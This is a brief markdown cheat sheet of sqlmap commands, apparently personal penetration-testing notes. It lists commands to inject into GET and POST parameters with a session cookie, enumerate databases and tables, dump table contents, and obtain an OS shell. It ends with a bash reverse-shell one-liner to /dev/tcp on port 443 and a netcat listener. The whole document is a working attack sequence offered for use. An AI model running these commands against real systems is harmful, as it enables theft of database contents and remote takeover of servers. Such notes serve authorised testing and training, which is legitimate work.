# sqlmap

- see also:
> https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap

- don't forget to provide authentication
> sqlmap -u http://10.129.214.232/dashboard.php?search=dsad --cookie="PHPSESSID=3melqar30vce8aa6lnra6s6l1g"

- post request
> sqlmap -u http://example.com --data "username=*&password=*"

- get all databases
> sqlmap -u http://example.com --batch --dbs

- get tables of database
> sqlmap -u http://example.com --batch --tables -D <DATABASE>

- get content of table
> sqlmap -u http://example.com --batch --dump -T <TABLE> -D <DATABASE>

- get simple shell
> sqlmap -u http://example.com --os-shell

- if simple shell is working, upgrade to more stable shell by executing
> bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"

- and on host
> nc -nlvp 443